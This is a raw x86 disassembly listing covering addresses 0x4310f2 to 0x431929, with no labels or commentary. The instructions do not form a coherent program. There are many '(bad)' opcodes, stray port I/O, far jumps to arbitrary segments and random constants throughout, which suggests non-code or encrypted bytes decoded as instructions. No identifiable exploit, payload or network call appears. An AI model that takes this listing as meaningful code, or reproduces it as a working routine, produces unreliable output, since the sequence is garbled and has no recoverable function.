  4310f2:	shl    BYTE PTR fs:[eax],0xeb
  4310f6:	cmp    bl,0xd4
  4310f9:	jmp    0xb235:0x92c584b4
  431100:	xor    eax,0x1ff42282
  431105:	and    BYTE PTR [eax-0x11d6e6b7],dh
  43110b:	lods   eax,DWORD PTR ds:[esi]
  43110c:	int    0xb4
  43110e:	ja     0x431167
  431110:	push   0x6cb0bb2
  431115:	imul   BYTE PTR ds:0x59201700
  43111b:	popf   
  43111c:	pop    ds
  43111d:	imul   ebp,ecx,0xd62fa208
  431123:	ja     0x431196
  431125:	pushf  
  431126:	fwait
  431127:	push   eax
  431128:	pop    ebp
  431129:	mov    eax,ds:0x329572f4
  43112e:	mov    esp,0x225aea06
  431133:	aad    0x18
  431135:	popf   
  431136:	pop    eax
  431137:	jg     0x431117
  431139:	pushf  
  43113a:	fwait
  43113b:	pop    esp
  43113c:	repz add eax,0xd249dbb6
  431142:	add    BYTE PTR [edx-0x5b4cb819],cl
  431148:	sbb    DWORD PTR [edi-0x6d8cbab],ebx
  43114e:	inc    edi
  43114f:	shl    BYTE PTR ds:0x80ec9f78,1
  431155:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  431156:	enter  0x49f6,0xcc
  43115a:	xchg   edi,eax
  43115b:	jno    0x431146
  43115d:	dec    edi
  43115e:	push   ss
  43115f:	in     eax,dx
  431160:	jecxz  0x4310f7
  431162:	sub    BYTE PTR [esi+0x45],ch
  431165:	push   esp
  431166:	jp     0x431156
  431168:	imul   ecx,esi,0x91e737c
  43116e:	loopne 0x431110
  431170:	in     eax,0xfe
  431172:	jle    0x431188
  431174:	xor    bh,BYTE PTR [eax-0x720e6e05]
  43117a:	and    DWORD PTR [edx+0x4e],esi
  43117d:	mov    al,ds:0x7a04e86a
  431182:	push   0x3c79941e
  431187:	call   0xe7ed6391
  43118c:	frstor [ebp+0x25ac678b]
  431192:	call   0x21d7b1b2
  431197:	fwait
  431198:	xor    esi,edx
  43119a:	mov    bl,0x54
  43119c:	in     eax,dx
  43119d:	div    ebp
  43119f:	sub    al,0x55
  4311a1:	mov    bl,0x73
  4311a3:	repz push es
  4311a5:	and    eax,0x5924a4fa
  4311aa:	jecxz  0x431202
  4311ac:	stos   DWORD PTR es:[edi],eax
  4311ad:	sbb    DWORD PTR [esi-0x44627532],ecx
  4311b3:	push   cs
  4311b4:	ins    BYTE PTR es:[edi],dx
  4311b5:	mov    edi,esi
  4311b7:	xor    ebx,eax
  4311b9:	daa    
  4311ba:	int3   
  4311bb:	pop    edx
  4311bc:	mov    edi,0xe304b3ca
  4311c1:	ficom  WORD PTR [edi]
  4311c3:	call   0xf41801dd
  4311c8:	adc    al,0x9d
  4311ca:	cmp    al,0x19
  4311cd:	pop    ecx
  4311ce:	popf   
  4311cf:	sub    ecx,DWORD PTR [esi]
  4311d1:	jle    0x431162
  4311d3:	inc    ebp
  4311d4:	cwde   
  4311d5:	data16 fild WORD PTR [eax+0x17]
  4311d9:	rcl    DWORD PTR [ecx-0x65c72261],1
  4311df:	jno    0x431204
  4311e1:	or     ecx,ebp
  4311e3:	cmp    al,0xed
  4311e5:	and    edx,DWORD PTR [eax-0x63722473]
  4311eb:	mov    eax,0x688be289
  4311f0:	sbb    ah,BYTE PTR [ecx-0x34f2c549]
  4311f6:	xor    eax,ebp
  4311f8:	sbb    esp,DWORD PTR [ebp+0x6e016fcf]
  4311fe:	sub    BYTE PTR ds:0xf09fb965,0x83
  431205:	pop    ebp
  431206:	(bad)  
  431207:	aas    
  431208:	data16 ror BYTE PTR [ebp-0x54aacdaf],0xc6
  431210:	ss dec esi
  431212:	mov    bh,0xa4
  431214:	dec    dh
  431216:	dec    ebx
  431217:	cld    
  431218:	sub    dl,bh
  43121a:	or     al,0x8d
  43121c:	mov    eax,ds:0x1de53575
  431221:	dec    ecx
  431222:	loope  0x431226
  431224:	push   0x8d281f0d
  431229:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43122a:	or     esi,DWORD PTR ds:0x329b2ff5
  431230:	add    DWORD PTR [eax],0xe
  431233:	mov    esi,0x24c0736f
  431238:	fstp   DWORD PTR [ecx+0x34]
  43123b:	div    BYTE PTR [ecx-0x5c]
  43123e:	jnp    0x431264
  431240:	push   esi
  431241:	pop    es
  431242:	mov    eax,0xcf7a2b68
  431247:	pop    edx
  431248:	and    dh,ah
  43124a:	nop
  43124b:	div    BYTE PTR [esi+ebx*4-0x59]
  43124f:	or     DWORD PTR [esi+esi*2+0x10265aa1],esi
  431256:	sbb    eax,0x4e383b02
  43125b:	test   eax,0x34690eb5
  431260:	hlt    
  431261:	jmp    0x431218
  431263:	hlt    
  431264:	lods   eax,DWORD PTR ds:[esi]
  431265:	test   al,0x83
  431267:	push   cs
  431268:	out    0x54,eax
  43126a:	mov    bl,0xa5
  43126c:	push   ebp
  43126d:	iret   
  43126e:	pushf  
  43126f:	in     eax,0x35
  431271:	push   eax
  431272:	dec    edi
  431273:	(bad)  
  431274:	imul   esi,DWORD PTR [edi],0x17bef4c2
  43127a:	ror    DWORD PTR [edx-0x55445875],1
  431280:	(bad)  
  431281:	fcomi  st,st(2)
  431283:	jp     0x43124e
  431285:	addr16 add eax,0xbecd306c
  43128b:	hlt    
  43128c:	sbb    eax,0x3d8085ed
  431291:	popf   
  431292:	or     ebx,DWORD PTR [eax-0x43]
  431295:	sbb    eax,DWORD PTR [ecx-0x32]
  431298:	inc    eax
  431299:	(bad)  
  43129a:	and    dl,BYTE PTR [ecx+edx*4-0x44]
  43129e:	mov    ebx,0x126ba204
  4312a3:	lods   eax,DWORD PTR ds:[esi]
  4312a4:	mov    esp,0x5bfbdc94
  4312a9:	push   ebp
  4312aa:	enter  0x27bd,0x6a
  4312ae:	mov    edx,0x2b1921fc
  4312b3:	xor    DWORD PTR [ebp-0x55],ecx
  4312b6:	push   ds
  4312b7:	outs   dx,BYTE PTR ds:[esi]
  4312b8:	(bad)  [ebx+ecx*2-0x107dfbb9]
  4312bf:	xor    bh,bl
  4312c1:	sti    
  4312c2:	mov    ah,BYTE PTR [ecx+0x23]
  4312c5:	cdq    
  4312c6:	dec    esi
  4312c7:	or     al,0x7d
  4312c9:	cmc    
  4312ca:	xchg   ebp,eax
  4312cb:	push   ss
  4312cc:	out    0x80,al
  4312ce:	int    0xaf
  4312d0:	mov    al,0xa4
  4312d2:	dec    edi
  4312d3:	in     al,dx
  4312d4:	repz jmp 0x9ce436d5
  4312da:	jmp    0x2f5a79bc
  4312df:	loopne 0x431290
  4312e1:	mov    eax,ds:0x757decb0
  4312e6:	fstp   QWORD PTR [eax+edi*8-0x62]
  4312ea:	jae    0x4312f3
  4312ec:	je     0x431338
  4312ee:	dec    ecx
  4312ef:	sahf   
  4312f0:	inc    ebx
  4312f1:	or     BYTE PTR [edi],dl
  4312f3:	je     0x4312e0
  4312f5:	jge    0x4312ad
  4312f7:	aam    0xfb
  4312f9:	inc    ebp
  4312fa:	icebp  
  4312fb:	add    al,0x85
  4312fd:	sub    BYTE PTR [eax],dl
  4312ff:	jmp    0xf2b9e64d
  431304:	inc    edx
  431305:	out    0x96,eax
  431307:	sbb    DWORD PTR [ebx],esp
  431309:	mov    BYTE PTR [ecx-0x42cc2d93],dh
  43130f:	xor    al,0x5a
  431311:	mov    bh,0x33
  431313:	xchg   ebp,eax
  431314:	mov    dh,0x0
  431316:	xor    ebx,DWORD PTR [ebp-0x3ba4598f]
  43131c:	adc    DWORD PTR [ebx],ecx
  43131e:	mov    al,ds:0xd99c624
  431323:	in     al,0x19
  431325:	inc    edi
  431326:	mov    ah,0xf
  431328:	loop   0x431392
  43132a:	pop    eax
  43132b:	sahf   
  43132c:	je     0x4313ac
  43132e:	mov    ebx,0x1cba3194
  431333:	jbe    0x43139a
  431335:	inc    ebp
  431336:	mov    dh,0xe8
  431338:	xchg   ecx,eax
  431339:	ror    DWORD PTR [edx-0x6f],1
  43133c:	adc    ebp,ebp
  43133e:	ins    BYTE PTR es:[edi],dx
  43133f:	int    0x3d
  431341:	mov    esi,edi
  431343:	pop    ds
  431344:	rcl    DWORD PTR [eax+0x36168e6],0x0
  43134b:	hlt    
  43134c:	inc    ebp
  43134d:	sub    dl,dh
  43134f:	icebp  
  431350:	sub    al,0xe3
  431352:	adc    esp,ebp
  431354:	cld    
  431355:	leave  
  431356:	(bad)  
  431357:	cmp    BYTE PTR [ebx+0x395f5a95],ah
  43135d:	aaa    
  43135e:	mov    ebp,0xeb9fb6f1
  431363:	in     al,dx
  431364:	(bad)  
  431365:	and    al,0xd3
  431367:	pop    ebx
  431368:	lods   eax,DWORD PTR ds:[esi]
  431369:	js     0x4313ce
  43136b:	arpl   WORD PTR [edx-0x4e],ax
  43136e:	mov    edx,0xec456654
  431373:	xchg   ebp,eax
  431374:	ss mov ch,0x54
  431377:	fmul   DWORD PTR ds:0x12807234
  43137d:	jp     0x431339
  43137f:	dec    edx
  431380:	sbb    cl,BYTE PTR [ecx]
  431382:	mov    dh,0x60
  431384:	dec    edi
  431385:	ds fsub DWORD PTR ss:[edx-0x59]
  43138a:	retf   
  43138b:	or     al,0xae
  43138d:	sbb    DWORD PTR [ebx-0x17],edi
  431390:	jle    0x4313b3
  431392:	adc    edx,DWORD PTR [eax+ebp*2-0xecb4c11]
  431399:	out    0x97,al
  43139b:	outs   dx,DWORD PTR ds:[esi]
  43139c:	test   DWORD PTR [ebx+0x3f],ebp
  43139f:	jmp    0x4313a7
  4313a1:	xchg   edx,eax
  4313a2:	pop    ss
  4313a3:	jnp    0x4313b5
  4313a5:	cmp    eax,ebx
  4313a7:	xor    al,0x2
  4313a9:	xor    bl,BYTE PTR [edx-0x1dadf615]
  4313af:	rol    DWORD PTR [ebx],cl
  4313b1:	fadd   QWORD PTR [eax+0x2ba8a4ea]
  4313b7:	icebp  
  4313b8:	rcl    BYTE PTR [ecx+0x63446abc],0xcd
  4313bf:	rol    esi,0x32
  4313c2:	mov    ah,0xc0
  4313c5:	or     DWORD PTR [ecx+ebx*2-0x25],ebx
  4313c9:	sbb    BYTE PTR [eax+0x3f63c6f2],dl
  4313cf:	lahf   
  4313d0:	or     eax,DWORD PTR [ecx-0x16b6a064]
  4313d6:	inc    esp
  4313d7:	repz xchg edx,eax
  4313d9:	mov    ds:0x3933873b,eax
  4313de:	stc    
  4313df:	loop   0x43138a
  4313e1:	mov    eax,ds:0x3f06d577
  4313e6:	mov    dh,0xb4
  4313e8:	cli    
  4313e9:	jmp    0x431468
  4313eb:	xchg   DWORD PTR [esi+0x291e45b9],eax
  4313f1:	xor    ecx,DWORD PTR [esi-0x44]
  4313f4:	fst    QWORD PTR [esp+esi*4+0x3c]
  4313f8:	sar    BYTE PTR [ebp-0x4f],1
  4313fb:	aam    0x7c
  4313fd:	dec    ebp
  4313fe:	adc    eax,0x287bd9ed
  431403:	push   0x58
  431405:	and    esi,DWORD PTR [edx+0x6c33b784]
  43140b:	mov    edi,0xf5932e68
  431410:	icebp  
  431411:	sbb    DWORD PTR [ecx-0x41fde03],ecx
  431417:	fs xor eax,0xd3ebb3ef
  43141d:	push   edx
  43141e:	ds mov eax,edi
  431421:	push   0xbfa16f98
  431426:	mov    ah,0x14
  431428:	xchg   ebx,eax
  431429:	sub    DWORD PTR [ebp-0x3f],ebp
  43142c:	add    eax,0xa1fe8964
  431431:	mov    bh,0x29
  431433:	push   ecx
  431434:	inc    ecx
  431435:	mov    bh,0xcf
  431437:	icebp  
  431438:	mov    dl,0xa8
  43143a:	cmp    DWORD PTR [eax],0x2b
  43143d:	stos   DWORD PTR es:[edi],eax
  43143e:	push   cs
  43143f:	lods   eax,DWORD PTR ds:[esi]
  431440:	mov    esi,0xc0a4dba8
  431445:	xor    dl,dh
  431447:	leave  
  431448:	cmp    BYTE PTR [esp+eiz*8],cl
  43144b:	rcr    BYTE PTR [edx+edx*4-0x472e4b49],cl
  431452:	jp     0x431468
  431454:	xor    eax,0x37f0459f
  431459:	sub    bl,dh
  43145b:	inc    eax
  43145c:	sbb    BYTE PTR [ecx],bh
  43145e:	aaa    
  43145f:	jns    0x4314c9
  431461:	int    0xef
  431463:	push   eax
  431464:	or     DWORD PTR [ebx+0x4635deaa],edi
  43146a:	adc    esp,ebp
  43146c:	push   eax
  43146d:	adc    ecx,0x6d5b046d
  431473:	or     ebx,DWORD PTR [edi]
  431475:	lds    ebp,FWORD PTR [edi]
  431477:	jnp    0x431475
  431479:	fisttp DWORD PTR [ebx-0x4f]
  43147c:	test   BYTE PTR [edi+eiz*2+0x639eee9f],0x71
  431484:	ret    0xc60c
  431487:	push   0xe911252e
  43148c:	sbb    BYTE PTR [ecx+0x72c2bcd6],ch
  431492:	mov    ds:0x364cfd48,eax
  431497:	out    dx,al
  431498:	mov    ecx,0x1ed3156c
  43149d:	cmc    
  43149e:	push   0xd4d05c50
  4314a3:	ret    
  4314a4:	div    BYTE PTR [esi-0x1d8bdc1f]
  4314aa:	xchg   si,ax
  4314ac:	mov    ebp,0x20703f24
  4314b1:	jl     0x431471
  4314b3:	in     al,0x70
  4314b5:	stos   BYTE PTR es:[edi],al
  4314b6:	push   0x1311b5b4
  4314bb:	repnz add DWORD PTR [edx+ebp*2],esi
  4314bf:	in     eax,0x23
  4314c1:	imul   esp,DWORD PTR [edi+0x70fff967],0x1ba102aa
  4314cb:	cmp    al,0x99
  4314cd:	pop    ds
  4314ce:	in     al,dx
  4314cf:	jmp    0x6695fdce
  4314d4:	dec    esi
  4314d5:	(bad)  
  4314d6:	mov    esi,0x4c09e814
  4314db:	jmp    0xf0ceb424
  4314e0:	jg     0x431540
  4314e2:	jnp    0x4314cf
  4314e4:	mov    ds:0x1dcabd9,eax
  4314e9:	mov    cl,0x24
  4314eb:	jl     0x43147b
  4314ed:	aad    0xc8
  4314ef:	in     al,0x81
  4314f1:	jmp    0x82fb:0x9c28c566
  4314f8:	xlat   BYTE PTR ds:[ebx]
  4314f9:	out    0xd7,al
  4314fb:	stos   BYTE PTR es:[edi],al
  4314fc:	repnz iret 
  4314fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4314ff:	sti    
  431500:	add    eax,0x6434c3e3
  431505:	test   al,0x9d
  431507:	xor    DWORD PTR [edi+0x59543ba2],edi
  43150d:	add    ebx,edx
  43150f:	push   ebx
  431510:	in     al,dx
  431511:	in     al,dx
  431512:	mov    bl,0x22
  431514:	xchg   edi,eax
  431515:	test   BYTE PTR [esi-0x3379dabc],bh
  43151b:	mov    ebx,0xc39c95cd
  431520:	dec    ebp
  431521:	dec    ebx
  431522:	sbb    al,0xd
  431524:	out    dx,al
  431525:	aam    0xba
  431527:	cmp    al,0x16
  431529:	jl     0x431533
  43152b:	inc    ebx
  43152c:	sub    BYTE PTR [eax-0x4c2a6bf5],bh
  431532:	adc    al,0xe5
  431534:	or     DWORD PTR [edx],edx
  431536:	push   esp
  431537:	stos   DWORD PTR es:[edi],eax
  431538:	sbb    al,0xe9
  43153a:	and    esp,0xffffffd5
  43153d:	test   eax,0xa0b4cf61
  431542:	cmp    esp,DWORD PTR [edi-0x5f287e82]
  431548:	inc    ebp
  431549:	pop    ebp
  43154a:	aaa    
  43154b:	mov    dl,BYTE PTR [esi]
  43154d:	jmp    0xacbe7155
  431552:	pusha  
  431553:	and    dl,BYTE PTR [eax+eiz*4]
  431556:	sti    
  431557:	call   0xecec:0xd33c51b2
  43155e:	loopne 0x4314fd
  431560:	sbb    BYTE PTR [ecx-0x26220b8f],cl
  431566:	pop    DWORD PTR [ecx]
  431568:	das    
  431569:	jne    0x4315ca
  43156b:	pop    ebp
  43156c:	sbb    al,0x41
  43156e:	stos   BYTE PTR es:[edi],al
  43156f:	pop    edi
  431570:	lahf   
  431571:	(bad)  
  431572:	mov    WORD PTR [eax],gs
  431574:	fwait
  431575:	fs out 0x47,al
  431578:	das    
  431579:	sub    eax,0x615694b9
  43157e:	into   
  43157f:	stos   BYTE PTR es:[edi],al
  431580:	jne    0x4315d5
  431582:	shr    edx,cl
  431584:	xchg   edx,eax
  431585:	fwait
  431586:	pop    edi
  431587:	adc    BYTE PTR [eax],ah
  431589:	cmp    DWORD PTR [edx+0x185357ec],edx
  43158f:	rol    esi,cl
  431591:	retf   
  431592:	xchg   DWORD PTR [edi],eax
  431594:	mov    ecx,0xc4a8120e
  431599:	mov    al,ds:0x58e361ac
  43159e:	cmc    
  43159f:	test   DWORD PTR [ebp-0x74],esi
  4315a2:	mov    ebx,0x8cbd79b4
  4315a7:	xor    dl,BYTE PTR ds:0xa1e57c81
  4315ad:	lds    esi,FWORD PTR [esi+0x23c92051]
  4315b3:	push   ss
  4315b4:	sub    BYTE PTR [edi+ebp*2],0xe5
  4315b8:	in     al,0xf1
  4315ba:	jb     0x4315b6
  4315bc:	test   ebp,ebx
  4315be:	inc    esp
  4315bf:	sti    
  4315c0:	je     0x4315c5
  4315c2:	and    esp,DWORD PTR [eax]
  4315c4:	sbb    eax,0xf6e08d84
  4315c9:	aas    
  4315ca:	lock adc BYTE PTR [esi],ch
  4315cd:	and    eax,0xc6477bdf
  4315d2:	mov    esp,0x84e39110
  4315d7:	repz push ds
  4315d9:	test   eax,0x18a0b370
  4315de:	inc    esp
  4315df:	xchg   edi,eax
  4315e0:	sti    
  4315e1:	lods   eax,DWORD PTR ds:[esi]
  4315e2:	pop    ebx
  4315e3:	mov    eax,ds:0x7f9228c6
  4315e8:	fsub   DWORD PTR [edi]
  4315ea:	jns    0x43163a
  4315ec:	sbb    al,0x39
  4315ee:	push   ebp
  4315ef:	sub    esi,edx
  4315f1:	std    
  4315f2:	adc    eax,DWORD PTR [eax]
  4315f4:	sbb    al,0x56
  4315f6:	inc    ebx
  4315f7:	in     al,0xe5
  4315f9:	mov    edx,0xf38be860
  4315fe:	pop    edi
  4315ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  431600:	sbb    BYTE PTR [ecx-0x6d],cl
  431603:	aam    0xc6
  431605:	leave  
  431606:	loop   0x4315c1
  431608:	cmp    ebp,ecx
  43160a:	stos   DWORD PTR es:[edi],eax
  43160b:	mov    al,0x7c
  43160d:	mov    dh,0xa7
  43160f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431610:	and    ebx,DWORD PTR [ecx]
  431612:	mov    ebx,DWORD PTR [esi-0x5c]
  431615:	dec    ebp
  431616:	out    dx,al
  431617:	les    ebp,FWORD PTR [ebp+ebx*4-0x45]
  43161b:	push   esi
  43161c:	test   eax,0x520787c4
  431621:	and    DWORD PTR [edi+edi*4+0x4ec6fe7],eax
  431628:	jbe    0x4315c5
  43162a:	xor    edx,DWORD PTR [ebx]
  43162c:	dec    ebx
  43162d:	mov    ecx,0x77478e59
  431632:	nop
  431633:	scas   eax,DWORD PTR es:[edi]
  431634:	lods   eax,DWORD PTR ds:[esi]
  431635:	outs   dx,DWORD PTR ds:[esi]
  431636:	add    ebp,eax
  431638:	out    dx,al
  431639:	and    al,0x28
  43163b:	mov    dh,0xc0
  43163d:	mov    al,0xb8
  43163f:	fs sti 
  431641:	(bad)  [edi-0x28436a90]
  431647:	in     al,dx
  431648:	ds es and al,0xff
  43164c:	sbb    ecx,ebx
  43164e:	lds    eax,FWORD PTR ds:0x1a449c74
  431654:	mov    WORD PTR [edx+0x3c],fs
  431657:	jmp    0x4316af
  431659:	pusha  
  43165a:	add    BYTE PTR [ebp-0x3b6855f9],ch
  431660:	pop    ss
  431661:	adc    eax,0xbec9197
  431666:	mov    dl,0xf4
  431668:	push   ss
  431669:	add    ebp,DWORD PTR [esi]
  43166b:	cmp    al,0x5a
  43166d:	fwait
  43166e:	dec    ebx
  43166f:	xor    al,0xd4
  431671:	push   ebp
  431672:	xchg   DWORD PTR [ecx+0xa],ecx
  431675:	or     dl,BYTE PTR [esi+esi*2+0x0]
  431679:	sahf   
  43167a:	sbb    DWORD PTR [ecx],ebx
  43167c:	(bad)  
  43167d:	cmp    eax,0xc3957d3b
  431682:	xchg   ebp,esi
  431684:	fisubr WORD PTR [edi+eiz*8+0x77]
  431688:	les    ebp,FWORD PTR [ebp-0x3c]
  43168b:	sub    DWORD PTR [ecx-0x18],ebp
  43168e:	mov    esi,0x64df6234
  431693:	cwde   
  431694:	adc    eax,0x3af3b33b
  431699:	stc    
  43169a:	pop    edi
  43169b:	cmp    ecx,DWORD PTR [edi+0x2a]
  43169e:	jae    0x43164f
  4316a0:	push   ss
  4316a1:	or     DWORD PTR [ecx+0x48],edi
  4316a4:	stc    
  4316a5:	inc    edi
  4316a6:	adc    DWORD PTR [edx],edi
  4316a8:	push   ss
  4316a9:	data16 into 
  4316ab:	and    BYTE PTR [edx-0x5c544614],cl
  4316b1:	xor    BYTE PTR ds:0xbe4a7103,bh
  4316b7:	fs (bad) 
  4316b9:	mov    ebp,0xaa258acb
  4316be:	retf   0xcef2
  4316c1:	push   eax
  4316c2:	repnz sbb BYTE PTR ds:0x4d732990,dl
  4316c9:	mov    BYTE PTR [ebx-0x33ef811b],dl
  4316cf:	add    al,0xd8
  4316d1:	add    ah,0x66
  4316d4:	(bad)  
  4316d5:	js     0x431721
  4316d7:	jmp    0xb645eff2
  4316dc:	xchg   BYTE PTR [edx],bl
  4316de:	jo     0x43175a
  4316e0:	jmp    0x4737e284
  4316e5:	(bad)  
  4316e7:	inc    ecx
  4316e8:	mov    ah,0x5f
  4316ea:	rol    dh,cl
  4316ec:	pop    ds
  4316ed:	ins    DWORD PTR es:[edi],dx
  4316ee:	stc    
  4316ef:	jbe    0x4316ae
  4316f1:	mov    edi,DWORD PTR [esi+0x5baa93b4]
  4316f7:	mov    ch,0xaf
  4316f9:	les    ebx,FWORD PTR [eax]
  4316fb:	leave  
  4316fc:	push   edi
  4316fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4316fe:	xor    ebx,ebp
  431700:	popa   
  431701:	xlat   BYTE PTR ds:[ebx]
  431702:	stos   DWORD PTR es:[edi],eax
  431703:	dec    eax
  431704:	rcl    BYTE PTR [eax],1
  431706:	mov    esp,0xe0937d04
  43170b:	jecxz  0x4316d3
  43170d:	mov    ds:0x411c9f56,eax
  431712:	stos   DWORD PTR es:[edi],eax
  431713:	mov    eax,ds:0x36cbd739
  431718:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431719:	jno    0x4316d1
  43171b:	add    al,0xef
  43171d:	pop    edi
  43171e:	in     eax,0x88
  431720:	inc    ebp
  431721:	inc    ebp
  431722:	dec    ebx
  431723:	icebp  
  431724:	rol    DWORD PTR [edx+edx*1],cl
  431727:	mov    eax,0xcc89a060
  43172c:	sbb    al,0xe9
  43172e:	mov    DWORD PTR [edi+ebp*8],edi
  431731:	ins    BYTE PTR es:[edi],dx
  431732:	mov    ax,0x9dea
  431736:	sti    
  431737:	xchg   esp,eax
  431738:	pop    edi
  431739:	pop    edx
  43173a:	mov    al,ds:0x930cab7d
  43173f:	inc    eax
  431740:	and    eax,0xb84b0dd
  431745:	dec    ecx
  431746:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431747:	mov    dl,0x26
  431749:	inc    esp
  43174a:	and    DWORD PTR [edx],eax
  43174c:	mov    ds:0xe331fbf7,al
  431751:	xor    cl,BYTE PTR [esi]
  431753:	outs   dx,DWORD PTR ds:[esi]
  431754:	sbb    al,0xf3
  431756:	mov    cl,0xc4
  431758:	out    dx,eax
  431759:	mov    ecx,DWORD PTR [eax+0x46cb7510]
  43175f:	in     eax,0xfe
  431761:	adc    cl,dl
  431763:	aaa    
  431764:	fs loopne 0x4317c2
  431767:	mov    dl,0x3a
  431769:	icebp  
  43176a:	mov    edi,0x9fe657d4
  43176f:	jle    0x4317c6
  431771:	aam    0x53
  431773:	in     al,dx
  431774:	(bad)  
  431775:	jb     0x43175a
  431777:	ja     0x43179b
  431779:	pop    ecx
  43177a:	ins    BYTE PTR es:[edi],dx
  43177b:	in     eax,0xde
  43177d:	push   ebp
  43177e:	pop    ebp
  43177f:	lds    edx,FWORD PTR [edi-0x20c743f6]
  431785:	xchg   esi,eax
  431786:	out    0x69,al
  431788:	dec    ebx
  431789:	pop    ebp
  43178a:	repnz inc BYTE PTR [edx-0x3659b291]
  431791:	and    eax,0x232b14b0
  431796:	dec    esi
  431797:	pop    ebp
  431798:	out    0xfd,al
  43179a:	retf   
  43179b:	sbb    esp,ebp
  43179d:	ss repz mov dh,0x66
  4317a1:	addr16 mov al,0x2d
  4317a4:	test   eax,0x63b4b09b
  4317a9:	mov    bl,dl
  4317ab:	dec    ecx
  4317ac:	xor    al,0xa2
  4317ae:	jmp    0x431823
  4317b0:	int3   
  4317b1:	dec    ecx
  4317b2:	jae    0x4317d9
  4317b4:	fcomi  st,st(4)
  4317b6:	or     eax,0xe403ea71
  4317bb:	in     al,0x9e
  4317bd:	push   esi
  4317be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4317bf:	pop    ds
  4317c0:	fs int3 
  4317c2:	push   0x74
  4317c4:	stc    
  4317c5:	ror    ebp,cl
  4317c7:	xchg   edx,eax
  4317c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4317c9:	imul   edi,DWORD PTR [edx+0x49ba62f4],0xbeaae391
  4317d3:	aam    0xfe
  4317d5:	retf   0x7ce9
  4317d8:	and    eax,0x23ea96db
  4317dd:	mov    cl,0xef
  4317df:	mov    cl,0x24
  4317e1:	or     DWORD PTR [ebp+0x8b31010],esi
  4317e7:	loope  0x4317ae
  4317e9:	call   0x6def:0xc0f77d3b
  4317f0:	out    0xfa,al
  4317f2:	sbb    al,0x59
  4317f4:	ret    
  4317f5:	dec    esi
  4317f6:	mov    esp,0x79e4bcd4
  4317fb:	cs push es
  4317fd:	shl    DWORD PTR [edi-0x4bdae523],0x63
  431804:	pop    esi
  431805:	sbb    eax,0x8c69dd87
  43180a:	and    al,BYTE PTR [ebp+0x22]
  43180d:	and    BYTE PTR [edi-0x645a8aeb],ch
  431813:	dec    ebp
  431814:	add    esi,DWORD PTR ds:0x3cd31c7c
  43181a:	mov    ebx,0xb4d36e36
  43181f:	xor    al,0x51
  431821:	cs xchg ebp,eax
  431823:	push   DWORD PTR ds:0xf0e9fdf5
  431829:	sub    al,0x52
  43182b:	sti    
  43182c:	jl     0x431819
  43182e:	arpl   WORD PTR [esp-0x57],bx
  431832:	lahf   
  431833:	xor    eax,0x444fc85
  431838:	inc    ebp
  431839:	adc    ch,BYTE PTR [ebp+0x6ba65fd1]
  43183f:	aaa    
  431840:	lock jnp 0x43187b
  431843:	les    ebx,FWORD PTR [edx]
  431845:	mov    DWORD PTR [ebp-0xab1e4a0],edx
  43184b:	dec    edi
  43184c:	gs popf 
  43184e:	dec    ebx
  43184f:	push   esi
  431850:	sub    ebp,DWORD PTR [edi+ebx*8-0x5d4afdc2]
  431857:	fidivr DWORD PTR [ebp-0x5047836f]
  43185d:	lahf   
  43185e:	jmp    0xe8cbc402
  431863:	adc    al,0x65
  431865:	cs out dx,al
  431867:	jmp    0x43187b
  431869:	repz sbb dh,BYTE PTR [edi-0x62]
  43186d:	cmp    al,0xdc
  43186f:	hlt    
  431870:	xor    eax,0xfcf18900
  431875:	cmc    
  431876:	imul   esp,DWORD PTR [ebx-0x1413f23b],0x55
  43187d:	das    
  43187e:	ret    0x1876
  431881:	fst    DWORD PTR [edx-0x1b]
  431884:	xor    BYTE PTR [ecx+0x53],bh
  431887:	sub    ch,dh
  431889:	outs   dx,DWORD PTR cs:[esi]
  43188b:	xchg   BYTE PTR [ecx],ah
  43188d:	xor    ebp,esi
  43188f:	add    dl,BYTE PTR [ecx]
  431891:	jae    0x4318a3
  431893:	shl    DWORD PTR [edi],1
  431895:	inc    edi
  431896:	xor    BYTE PTR [ebp+0x44bbaeab],0x10
  43189d:	ret    0xeb6
  4318a0:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  4318a2:	test   bh,ah
  4318a4:	jne    0x431839
  4318a6:	jbe    0x4318cf
  4318a8:	sbb    eax,0xc04c7779
  4318ad:	dec    esi
  4318ae:	fcomp  DWORD PTR [ebx+0x7ba842]
  4318b4:	imul   edx,DWORD PTR [ecx-0x69e9c845],0x88c7ddb4
  4318be:	mov    esi,0x3da9f2a4
  4318c3:	jbe    0x4318aa
  4318c5:	sub    eax,0xafe0f456
  4318ca:	adc    al,0x14
  4318cc:	sbb    BYTE PTR [ecx+0x7c],cl
  4318cf:	adc    esi,esi
  4318d1:	or     BYTE PTR [eax+0x23],bh
  4318d4:	cmp    al,0x9e
  4318d6:	cmp    ebx,DWORD PTR [edi+0x3b]
  4318d9:	or     DWORD PTR [ebx],ecx
  4318db:	rcr    DWORD PTR [edx],0xd3
  4318de:	and    BYTE PTR [esi-0x6b4aed22],dh
  4318e4:	add    eax,0x169aba0d
  4318e9:	cmp    ch,bh
  4318eb:	arpl   WORD PTR [esi+eiz*4+0x1b],ax
  4318ef:	aad    0x7f
  4318f1:	cld    
  4318f2:	jmp    FWORD PTR [esi]
  4318f4:	and    eax,0x97ac6469
  4318f9:	push   esp
  4318fa:	mov    bl,0x89
  4318fc:	jle    0x4318d5
  4318fe:	stos   DWORD PTR es:[edi],eax
  4318ff:	dec    esi
  431900:	jmp    0xcc28:0x97d5ea6d
  431907:	mov    bh,0xd4
  431909:	xor    BYTE PTR [esi-0x33],ch
  43190c:	gs das 
  43190e:	mov    edx,0x65a86494
  431913:	inc    ebx
  431914:	test   DWORD PTR ds:0xd9baf3a7,edx
  43191a:	retf   
  43191b:	xchg   edx,eax
  43191c:	sbb    cl,bh
  43191e:	push   ds
  43191f:	mul    BYTE PTR [ecx+0x75]
  431922:	ja     0x43196c
  431924:	sbb    eax,0xbedf9c0a
  431929:	mov    edi,es
